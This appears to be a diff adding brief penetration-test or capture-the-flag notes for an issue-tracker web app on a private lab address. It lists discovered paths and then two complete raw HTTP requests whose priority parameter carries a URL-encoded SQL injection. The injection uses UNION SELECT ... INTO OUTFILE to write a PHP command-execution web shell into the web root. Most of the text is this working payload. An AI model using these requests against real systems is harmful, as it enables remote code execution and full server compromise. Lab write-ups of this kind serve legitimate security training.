@@ -1,0 +1,38 @@
+Gobusting to find 
+
+/phpinfo.php on 30455
+/srv/http/phpinfo.php
+
+/cloud on 50080
+
+Find the source code of issue tracker
+
+GET /issue/checkByPriority not working, guess that user changed it to POST or something
+
+Final SQLI request
+
+POST /issue/checkByPriority?priority=Normal%27+UNION+SELECT+%27%3C%3Fphp+echo+exec%28%24_GET%5B%22cmd%22%5D%29%3B%27+into+OUTFILE+%27%2Fsrv%2Fhttp%2Fcmd6.php%27%3B+--+ HTTP/1.1
+Host: 192.168.222.147:17445
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://192.168.222.147:17445/user/list
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Cookie: JSESSIONID=6559984372932FD9B90BED4E8951DF47
+Connection: close
+
+POST /issue/checkByPriority?priority=%22%27+UNION+SELECT+%27%3C%3Fphp+echo+exec%28%24_GET%5B%22cmd%22%5D%29%3B%27+into+OUTFILE+%27%2Fsrv%2Fhttp%2Fcmd7.php%27%3B+--+ HTTP/1.1
+Host: 192.168.222.147:17445
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://192.168.222.147:17445/user/list
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Cookie: JSESSIONID=6559984372932FD9B90BED4E8951DF47
+Connection: close
+
+
+
+has to be like this if not it wont work, dont rly know why... 
